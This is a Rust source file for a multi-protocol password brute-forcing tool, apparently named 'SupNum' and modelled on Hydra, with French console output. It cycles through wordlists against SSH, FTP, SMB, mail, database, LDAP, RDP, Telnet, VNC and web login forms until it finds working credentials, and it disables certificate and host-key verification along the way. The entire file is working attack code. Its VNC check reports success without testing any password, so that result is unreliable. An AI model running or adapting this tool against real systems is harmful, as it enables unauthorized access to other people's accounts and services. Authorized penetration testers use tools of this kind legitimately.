mod args;
mod header;
use args::SupArgs;
use clap::Parser;
use sqlx::{Connection, MySqlConnection};
use std::sync::Arc;
use tokio::sync::Semaphore;
// use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt};
use colored::*;
//use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT, ACCEPT_LANGUAGE};
use russh::*;
use russh_keys::*;
use async_trait::async_trait;
use suppaftp::AsyncFtpStream;
use base64::{engine::general_purpose, Engine as _};
use native_tls::TlsConnector;
use tokio::process::Command;
use mongodb::{options::ClientOptions, Client as MongoClient};
use tokio::task::JoinSet;
use tokio::time::{timeout, Duration};
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::net::TcpStream;
use std::io::{ Write};
async fn is_anonymous_login(service: &str, host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", host, port);

    match service {
        "ftp" => {
      
            if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(&addr)).await {
                if ftp.login(user, pass).await.is_ok() {
             
                    let pwd_user = ftp.pwd().await.unwrap_or_default();
                    let _ = ftp.quit().await;

              
                    if let Ok(Ok(mut ftp_fake)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(&addr)).await {
                        if ftp_fake.login("ghost_user_99", "ghost_pass_99").await.is_ok() {
                            let pwd_fake = ftp_fake.pwd().await.unwrap_or_default();
                            let _ = ftp_fake.quit().await;
                            
                        
                            return pwd_user == pwd_fake;
                        }
                    }
                }
            }
        }
        "smb" => {
            
            let user_pass_fake = "invalid_user%invalid_pass";
            let share = format!("//{}//IPC$", host);

            let out_fake = Command::new("smbclient")
                .args([&share, "-U", user_pass_fake, "-c", "ls", "-t", "2"])
                .output().await;

            if let Ok(o) = out_fake {
             
                return o.status.success();
            }
        }
        _ => return false,
    }
    false
}
async fn check_anonymous(service: &str, host: &str, port: u16) -> bool {
    match service {
        "ftp" => {
            let addr = format!("{}:{}", host, port);
            if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(addr)).await {
                let res = ftp.login("anonymous", "anonymous").await.is_ok();
                let _ = ftp.quit().await; res
            } else { false }
        },
        "smb" => attempt_smb(host, "anonymous", "anonymous").await,
        _ => false,
    }
}
async fn detect_service(target: &str, port: u16) -> String {
    let addr = format!("{}:{}", target, port);
    let stream = tokio::time::timeout(Duration::from_secs(2), TcpStream::connect(&addr)).await;

    match stream {
        Ok(Ok(mut s)) => {
            let mut buffer = [0; 256];
            if let Ok(n) = timeout(Duration::from_millis(1500), s.read(&mut buffer)).await.unwrap_or(Ok(0)) {
                let resp = String::from_utf8_lossy(&buffer[..n]).to_uppercase();
                if resp.contains("SSH") { return "ssh".to_string(); }
                if resp.contains("220") && resp.contains("FTP") { return "ftp".to_string(); }
                if resp.contains("220") && (resp.contains("SMTP") || resp.contains("ESMTP")) { return "smtp".to_string(); }
                if resp.contains("MYSQL") || (n > 5 && buffer[4] == 0x0a) { return "mysql".to_string(); }
            }
            let _ = s.write_all(b"GET / HTTP/1.0\r\n\r\n").await;
            if let Ok(n) = timeout(Duration::from_millis(1000), s.read(&mut buffer)).await.unwrap_or(Ok(0)) {
                let resp = String::from_utf8_lossy(&buffer[..n]).to_uppercase();
                if resp.contains("HTTP") || resp.contains("HTML") { return "http".to_string(); }
            }
            "unknown".to_string()
        }
        _ => "closed".to_string(),
    }
}

async fn connect_tls(host: &str, port: u16) -> Option<tokio_native_tls::TlsStream<tokio::net::TcpStream>> {
    let addr = format!("{}:{}", host, port);
    let connector = TlsConnector::builder().danger_accept_invalid_certs(true).build().ok()?;
    let tokio_connector = tokio_native_tls::TlsConnector::from(connector);
    let stream = timeout(Duration::from_secs(3), tokio::net::TcpStream::connect(&addr)).await.ok()?.ok()?;
    tokio_connector.connect(host, stream).await.ok()
}



struct Client;

#[async_trait]
impl client::Handler for Client {
    type Error = russh::Error;

    async fn check_server_key(self, _server_public_key: &key::PublicKey) -> Result<(Self, bool), Self::Error> {
        Ok((self, true))
    }
}



async fn attempt_ssh_async(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let config = Arc::new(client::Config::default());
    let sh = Client;
    let addr = format!("{}:{}", host, port);

    
    let connect_res = tokio::time::timeout(
        std::time::Duration::from_secs(4), 
        client::connect(config, addr, sh)
    ).await;

    match connect_res {
        Ok(Ok(mut session)) => {
           
            let auth_res = tokio::time::timeout(
                std::time::Duration::from_secs(5),
                session.authenticate_password(user, pass)
            ).await;

            match auth_res {
                Ok(Ok(success)) => {
               
                    let _ = session.disconnect(Disconnect::ByApplication, "", "");
                    success
                },
                _ => false, 
            }
        },
        Ok(Err(e)) => {
           
            false
        }
        Err(_) => false,
    }
}
async fn attempt_smb(host: &str, user: &str, pass: &str) -> bool {
    let share = format!("//{}//IPC$", host);
    let user_pass = format!("{}%{}", user.trim(), pass.trim());

    let out = Command::new("smbclient")
        .args([&share, "-U", &user_pass, "-c", "ls", "-t", "3", "--no-pass"])
        .output().await;

    match out {
        Ok(o) => {
            let stderr = String::from_utf8_lossy(&o.stderr);
            let stdout = String::from_utf8_lossy(&o.stdout);
            if o.status.success() { return true; }
            if stderr.contains("NT_STATUS_OK") || stdout.contains("NT_STATUS_OK") { return true; }
            if stderr.contains("NT_STATUS_BAD_NETWORK_NAME") && !stderr.contains("LOGON_FAILURE") { return true; }
            false
        },
        _ => false,
    }
}

async fn attempt_smtp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"EHLO localhost\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(b"AUTH LOGIN\r\n").await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(user)).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("{}\r\n", general_purpose::STANDARD.encode(pass)).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("235");
    }
    false
}

async fn attempt_pop3(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("USER {}\r\n", user).as_bytes()).await;
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("PASS {}\r\n", pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("+OK");
    }
    false
}

async fn attempt_imap(host: &str, port: u16, user: &str, pass: &str) -> bool {
    if let Some(mut s) = connect_tls(host, port).await {
        let mut buf = [0; 1024];
        let _ = s.read(&mut buf).await;
        let _ = s.write_all(format!("A1 LOGIN {} {}\r\n", user, pass).as_bytes()).await;
        let n = timeout(Duration::from_secs(2), s.read(&mut buf)).await.unwrap_or(Ok(0)).unwrap_or(0);
        return String::from_utf8_lossy(&buf[..n]).contains("A1 OK");
    }
    false
}

async fn attempt_mysql(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let url = format!("mysql://{}:{}@{}:{}", user, pass, host, port);
    match timeout(Duration::from_secs(3), MySqlConnection::connect(&url)).await {
        Ok(Ok(conn)) => { 
            let _ = conn.close().await; 
            true
        }
        _ => false, 
    }
}

use sqlx::postgres::PgConnectOptions;
use sqlx::ConnectOptions;

async fn attempt_postgres(host: &str, port: u16, user: &str, pass: &str, db_list: &[String]) -> bool {
   
    let clean_user = user.trim();
    let clean_pass = pass.trim();

    for db in db_list {
        let clean_db = db.trim(); 
        
        let opts = PgConnectOptions::new()
            .host(host)
            .port(port)
            .username(clean_user)
            .password(clean_pass)
            .database(clean_db) 
            .disable_statement_logging();

       
        let res = timeout(Duration::from_secs(5), opts.connect()).await;

        match res {
            Ok(Ok(_conn)) => {
              
                println!("[*] Base de donne        : {}", clean_db);
                return true;
            },
            Ok(Err(e)) => {
              
                continue;
            }
            _ => continue,
        }
    }
    false
}
async fn attempt_redis(target: &str, port: u16, pass: &str) -> bool {
    let url = format!("redis://{}:{}", target, port);
    let client = match redis::Client::open(url) {
        Ok(c) => c,
        Err(_) => return false,
    };

    match client.get_connection_with_timeout(std::time::Duration::from_secs(3)) {
        Ok(mut con) => {
          
            let cmd = redis::cmd("AUTH").arg(pass).query::<bool>(&mut con);
            cmd.unwrap_or(false)
        },
        Err(_) => false,
    }
}
use urlencoding::encode; 

async fn attempt_mongodb(host: &str, port: u16, user: &str, pass: &str, auth_sources: &[String]) -> bool {
    let encoded_user = encode(user);
    let encoded_pass = encode(pass);

  
    for db in auth_sources {
        let uri = format!(
            "mongodb://{}:{}@{}:{}/?authSource={}", 
            encoded_user, encoded_pass, host, port, db
        );

        if let Ok(mut opt) = ClientOptions::parse(&uri).await {
            opt.connect_timeout = Some(Duration::from_secs(1));
            opt.server_selection_timeout = Some(Duration::from_secs(1));
            opt.direct_connection = Some(true);

            if let Ok(c) = MongoClient::with_options(opt) { 
                
                let result = timeout(Duration::from_secs(2), c.list_database_names(None, None)).await;
                if let Ok(Ok(_)) = result {
                    return true; 
                }
            }
        }
    }
    false
}

async fn attempt_ldap(host: &str, port: u16, user: &str, pass: &str) -> bool {

    let proto = if port == 636 { "ldaps" } else { "ldap" };
    let addr = format!("{}://{}:{}", proto, host, port);
    
    let u = user.to_string();
    let p = pass.to_string();

    tokio::task::spawn_blocking(move || {
        use ldap3::{LdapConn, LdapConnSettings};
        
        
        let settings = LdapConnSettings::new()
            .set_conn_timeout(std::time::Duration::from_secs(5));

        
        if let Ok(mut ldap) = LdapConn::with_settings(settings, &addr) {
            let res = ldap.simple_bind(&u, &p);
          
            let _ = ldap.unbind(); 
            return res.is_ok();
        }
        false
    }).await.unwrap_or(false)
}

async fn attempt_telnet(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let addr = format!("{}:{}", host, port);
    if let Ok(Ok(mut s)) = timeout(Duration::from_secs(3), TcpStream::connect(&addr)).await {
        let mut b = [0; 1024];
        let _ = s.read(&mut b).await; 
        
        let _ = s.write_all(format!("{}\n", user).as_bytes()).await;
        tokio::time::sleep(Duration::from_millis(500)).await;
        
        let _ = s.write_all(format!("{}\n", pass).as_bytes()).await;
        tokio::time::sleep(Duration::from_millis(500)).await;

        if let Ok(n) = timeout(Duration::from_secs(2), s.read(&mut b)).await.unwrap_or(Ok(0)) {
            let res = String::from_utf8_lossy(&b[..n]).to_lowercase();
            let failed = res.contains("login incorrect") || res.contains("failed") || res.contains("invalid");
            return !failed && (res.contains("$") || res.contains("#") || res.contains(">") || res.len() > 5);
        }
    }
    false
}

async fn attempt_rdp(host: &str, port: u16, user: &str, pass: &str) -> bool {
    let out = Command::new("xfreerdp")
    .args(["/v:", &format!("{}:{}", host, port), "/u:", user, "/p:", pass, "+auth-only", "/cert-ignore"])
    .output().await;
    out.map(|o| o.status.success()).unwrap_or(false)
}

fn find_name_by_type(html: &str, target_type: &str) -> Option<String> {
    let pattern = format!("type=\"{}\"", target_type);
    if let Some(pos) = html.find(&pattern) {
        let start_of_tag = html[..pos].rfind('<').unwrap_or(0);
        let end_of_tag = html[pos..].find('>').unwrap_or(html.len() - pos) + pos;
        let tag_content = &html[start_of_tag..end_of_tag];
        if let Some(name_pos) = tag_content.find("name=\"") {
            let start_name = name_pos + 6;
            if let Some(end_name) = tag_content[start_name..].find('\"') {
                return Some(tag_content[start_name..start_name+end_name].to_string());
            }
        }
    }
    None
}
async fn get_fake_body(
    client: &reqwest::Client,
    target: &str,
    port: u16,
    u_selector: &str,
    p_selector: &str,
) -> String {
    let url = if target.starts_with("http") {
        target.to_string()
    } else {
        let proto = if port == 443 { "https" } else { "http" };
        format!("{}://{}:{}", proto, target, port)
    };

  
    let fake_user = "non_existent_user_xyz_123";
    let fake_pass = "non_existent_pass_xyz_123";

    let params = [
        (u_selector.trim(), fake_user),
        (p_selector.trim(), fake_pass),
    ];

    let res = match client.post(&url).form(&params).send().await {
        Ok(r) => r,
        Err(_) => return String::new(),
    };

    res.text().await.unwrap_or_default()
}
async fn attempt_http(
    client: &reqwest::Client,
    target: &str,
    port: u16,
    user: &str,
    pass: &str,
    error_msg: &Option<String>,
    u_selector: &str,
    p_selector: &str,
    _fake_body: &str, 
) -> bool {
    
   
    let url = if target.starts_with("http") {
        target.to_string()
    } else {
        let proto = if port == 443 { "https" } else { "http" };
        format!("{}://{}:{}", proto, target, port)
    };

    let params = [(u_selector.trim(), user.trim()), (p_selector.trim(), pass.trim())];

  
    let res_post = client.post(&url)
        .header("User-Agent", "Mozilla/5.0 (Hydra/SupNum) Firefox/122.0")
        .header("Referer", &url)
        .form(&params)
        .send()
        .await;

 
    let res = match res_post {
        Ok(r) => r,
        Err(_) => {
        
            let full_url = match reqwest::Url::parse_with_params(&url, &params) {
                Ok(u) => u,
                Err(_) => return false,
            };
            match client.get(full_url)
                .header("User-Agent", "Mozilla/5.0 (Hydra/SupNum) Firefox/122.0")
                .send().await {
                Ok(r) => r,
                Err(_) => return false,
            }
        }
    };

    let status = res.status();
    
    
    if status.is_server_error() {
        return false;
    }

  
    let redirect_url = res.headers()
        .get("location")
        .and_then(|l| l.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    let body = res.text().await.unwrap_or_default();
    let body_low = body.to_lowercase();

    

    let mut is_failure = false;

  
    if let Some(msg) = error_msg {
        let m = msg.to_lowercase();
      
        if body_low.contains(&m) || redirect_url.contains(&m) {
            is_failure = true;
        }
    } else {
        
        let u_pattern = format!("name=\"{}\"", u_selector.to_lowercase());
        let p_pattern = format!("name=\"{}\"", p_selector.to_lowercase());
        
        if body_low.contains(&u_pattern) || body_low.contains(&p_pattern) || body_low.contains("type=\"password\"") {
            is_failure = true;
        }
    }


    if is_failure {
        return false;
    }

   
    if body.trim().starts_with('{') {
        let success_indicators = ["\"success\":true", "\"token\"", "access_token"];
        if success_indicators.iter().any(|&s| body_low.contains(s)) {
            return true;
        }
    
        return status.is_success();
    }

  
    if status.is_redirection() {
        
        if redirect_url.contains("login") || redirect_url.contains(u_selector) {
            return false;
        }
        return true;
    }

    
    if status.is_success() {
        return true;
    }

    false
}
async fn attempt_vnc(host: &str, port: u16, _pass: &str) -> bool { 
    let addr = format!("{}:{}", host, port);
    let mut stream = match timeout(Duration::from_secs(3), TcpStream::connect(&addr)).await {
        Ok(Ok(s)) => s,
        _ => return false,
    };
    let mut buf = [0; 12];
    if timeout(Duration::from_secs(2), stream.read_exact(&mut buf)).await.is_err() { return false; }
    if stream.write_all(&buf).await.is_err() { return false; }
    let mut sec_types = [0u8; 1];
    if stream.read_exact(&mut sec_types).await.is_err() { return false; }
    true 
}


#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    header::show("Cheikh ELghadi", "https://github.com/23092-ctrl");
    let args = SupArgs::parse();

    let input_target = args.target.trim();
    let temp_target = if !input_target.contains("://") {
        format!("{}://{}", args.service.to_lowercase(), input_target)
    } else {
        input_target.to_string()
    };

    let parsed_url = reqwest::Url::parse(&temp_target).expect("[-] Format de cible invalide.");
    let host_only = parsed_url.host_str().ok_or("Impossible d'extraire l'hôte")?.to_string();
    let t_service_lower = if input_target.contains("://") {
        parsed_url.scheme().to_lowercase()
    } else {
        args.service.to_lowercase()
    };

let auth_sources: Vec<String> = if let Some(path) = &args.bdlist {
    std::fs::read_to_string(path)
        .unwrap_or_default()
        .lines()
        .map(|s| s.trim().to_string())
        .collect()
} else {
    vec!["admin".to_string()] 
};
  let port_to_use = args.port.or(parsed_url.port()).unwrap_or(match t_service_lower.as_str() {

"ssh" => 22, "ftp" => 21, "smb" => 445, "mysql" => 3306,

"smtp" => 25, "pop3" => 110, "imap" => 143, "https" => 443,

"rdp" => 3389, "telnet" => 23, "mongodb" => 27017, "postgres" => 5432,

"vnc" => 5900, "ldap" => 389,
    "ldaps" => 636, "redis" => 6379,

_ => 80,

});

    let detected = detect_service(&host_only, port_to_use).await;
    if detected == "closed" {
        println!("{} Port {} fermé sur {}.", "[!]".red(), port_to_use, host_only);
        return Ok(());
    } 


    let success_found = Arc::new(AtomicBool::new(false));
    let semaphore = Arc::new(Semaphore::new(args.threads));
    let client = Arc::new(reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .timeout(Duration::from_secs(5))
        .build()?);

    let mut u_field = "username".to_string();
    let mut p_field = "password".to_string();

    if let Some(ref names) = args.names {
        u_field = names[0].clone();
        p_field = names[1].clone();
    } else if let Some(ref types) = args.types {
        if let Ok(resp) = client.get(input_target).send().await {
            if let Ok(html) = resp.text().await {
                if let Some(name) = find_name_by_type(&html, &types[0]) { u_field = name; }
                if let Some(name) = find_name_by_type(&html, &types[1]) { p_field = name; }
            }
        }
    }


 
   // --- 1. DÉFINITION DES FLUX (MODE 1 OU 2 WORDLISTS) ---
    let (mut user_lines, pass_file_path) = if args.wordlist.len() == 2 {
        let f_user = tokio::fs::File::open(&args.wordlist[0]).await?;
        (tokio::io::BufReader::new(f_user).lines(), Some(args.wordlist[1].clone()))
    } else {
        let f_single = tokio::fs::File::open(&args.wordlist[0]).await?;
        (tokio::io::BufReader::new(f_single).lines(), None)
    };

    let mut set = JoinSet::new();
    let target_user = args.user.as_deref().unwrap_or("multi");
    let cache_file = format!(".supnum_cache_{}_{}_{}", 
        host_only.replace(".", "_"), 
        t_service_lower,
        target_user
    );

    if args.init {
        let _ = std::fs::remove_file(&cache_file);
        println!("{} Cache initialisé.", "[*]".yellow());
    }

    let mut start_line = 0;
    if let Ok(content) = std::fs::read_to_string(&cache_file) {
        start_line = content.trim().parse::<usize>().unwrap_or(0);
        if start_line > 0 { println!("{} Reprise à la ligne : {}", "[*]".cyan(), start_line); }
    }

    println!("[*] Cible   : {}", host_only.bright_green().bold());
    println!("{} SERVICE : {}", "[*]".yellow(), t_service_lower.as_str().bright_cyan().bold());
    println!("------------------------------------------------------------");
  
    let t_delay = args.delay; 
    let mut current_line = 0;
    let mut skip_anonymous = false;

    // --- 2. VÉRIFICATION ANONYMOUS ---
    if t_service_lower == "ftp" || t_service_lower == "smb" {
        println!("{} Vérification de la politique d'accès du serveur...", "[*]".cyan());
        let is_anonymous = check_anonymous(&t_service_lower, &host_only, port_to_use).await;
        if is_anonymous {
            println!("\n{}", "====================================================".yellow().bold());
            println!("{} ATTENTION : Le serveur accepte les connexions ANONYMES !", "[!]".yellow().bold());
            println!("{}", "====================================================".yellow().bold());
            print!("{} Voulez-vous IGNORER l'utilisateur 'anonymous' ? (Y/n): ", "[?]".blue());
            let _ = std::io::stdout().flush();
            let mut ans = String::new();
            let _ = std::io::stdin().read_line(&mut ans);
            if ans.trim().to_lowercase() != "n" {
                skip_anonymous = true;
                println!("{} L'utilisateur 'anonymous' sera filtré.", "[*]".green());
            }
        }
    }
 let fake_body = get_fake_body(&client, &input_target, port_to_use, &u_field, &p_field).await;
    // --- 3. BOUCLE PRINCIPALE ---
    while let Ok(Some(line1)) = user_lines.next_line().await {
        let raw1 = line1.trim().to_string();
        if raw1.is_empty() { continue; }

  
        let mut pairs = Vec::new();

        if let Some(pass_path) = &pass_file_path {
        
            let f_pass = tokio::fs::File::open(pass_path).await?;
            let mut pass_inner = tokio::io::BufReader::new(f_pass).lines();
            while let Ok(Some(line2)) = pass_inner.next_line().await {
                let raw2 = line2.trim().to_string();
                if !raw2.is_empty() { pairs.push((raw1.clone(), raw2)); }
            }
        } else {
            
            current_line += 1;
            if current_line <= start_line { continue; }
            if current_line % 100 == 0 { let _ = std::fs::write(&cache_file, current_line.to_string()); }

            let (u, p) = if let (Some(fu), Some(fp)) = (&args.user, &args.password) { (fu.clone(), fp.clone()) }
            else if let Some(fu) = &args.user { (fu.clone(), raw1.clone()) }
            else if let Some(fp) = &args.password { (raw1.clone(), fp.clone()) }
            else if raw1.contains(':') {
                let parts: Vec<&str> = raw1.splitn(2, ':').collect();
                (parts[0].to_string(), parts[1].to_string())
            } else { (raw1.clone(), raw1.clone()) };
            pairs.push((u, p));
        }

        // --- EXÉCUTION DES ATTAQUES ---
        for (u, p) in pairs {
            if success_found.load(Ordering::SeqCst) { break; }
            
            let t_u = u; let t_p = p;
            let t_host = host_only.clone();
            let t_url = input_target.to_string(); 
            let t_service = t_service_lower.clone();
            let t_client = Arc::clone(&client);
            let t_success = Arc::clone(&success_found);
            let t_error = args.error.clone();
            let (t_uf, t_pf) = (u_field.clone(), p_field.clone());
            let t_port = port_to_use;
            let t_cache_name = cache_file.clone(); 
            let skip_anon_flag = skip_anonymous;

            let permit = Arc::clone(&semaphore).acquire_owned().await?;
            let t_fake = fake_body.clone();
            let dbs_for_thread = auth_sources.clone();
            set.spawn(async move {
                let _permit = permit;
                if t_success.load(Ordering::SeqCst) { return; }
                if let Some(ms) = t_delay { tokio::time::sleep(Duration::from_millis(ms)).await; }

                let is_ok = match t_service.as_str() {
                    "ssh" => attempt_ssh_async(&t_host, t_port, &t_u, &t_p).await,
                   "http" | "https" => attempt_http(&t_client, &t_url, t_port, &t_u, &t_p, &t_error, &t_uf, &t_pf, &t_fake).await,
                    "ftp" => {
                        let addr = format!("{}:{}", t_host, t_port);
                        let mut ok = false;
                        if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(addr)).await {
                            if ftp.login(&t_u, &t_p).await.is_ok() {
                                if skip_anon_flag && t_u == "anonymous" { return; }
                                ok = true;
                            }
                        }
                        ok
                    },
                    "smb" => {
                        let ok = attempt_smb(&t_host, &t_u, &t_p).await;
                        if ok && skip_anon_flag && is_anonymous_login("smb", &t_host, t_port, &t_u, &t_p).await { return; }
                        ok
                    },

                    "mysql"    => attempt_mysql(&t_host, t_port, &t_u, &t_p).await,
                    "postgres" => attempt_postgres(&t_host, t_port, &t_u, &t_p, &dbs_for_thread).await,
                    
                  "mongodb" => attempt_mongodb(&t_host, t_port, &t_u, &t_p, &dbs_for_thread).await,
                    "smtp"     => attempt_smtp(&t_host, t_port, &t_u, &t_p).await,
                    "pop3"     => attempt_pop3(&t_host, t_port, &t_u, &t_p).await,
                    "imap"     => attempt_imap(&t_host, t_port, &t_u, &t_p).await,
                    "ldap" |"ldaps"    => attempt_ldap(&t_host, t_port, &t_u, &t_p).await,
                    "telnet"   => attempt_telnet(&t_host, t_port, &t_u, &t_p).await,
                    "rdp"      => attempt_rdp(&t_host, t_port, &t_u, &t_p).await,
                    "vnc"      => attempt_vnc(&t_host, t_port, &t_p).await,
                    "redis" => attempt_redis(&t_host, t_port, &t_p).await,
                    _ => false,
                };

                if is_ok && !t_success.swap(true, Ordering::SeqCst) {
                    let _ = std::fs::remove_file(&t_cache_name); 
                    println!("\n\n{}", "====================================================".green().bold());
                    println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
                    println!("{} UTILISATEUR : {}", " >".cyan(), t_u.bright_white().bold());
                    println!("{} MOT DE PASSE : {}", " >".cyan(), t_p.bright_yellow().bold());
                    println!("{}", "====================================================".green().bold());
                    std::process::exit(0);
                }
            });
        }
        if success_found.load(Ordering::SeqCst) { break; }
    }
    while let Some(_) = set.join_next().await {}
    Ok(())
    }

 

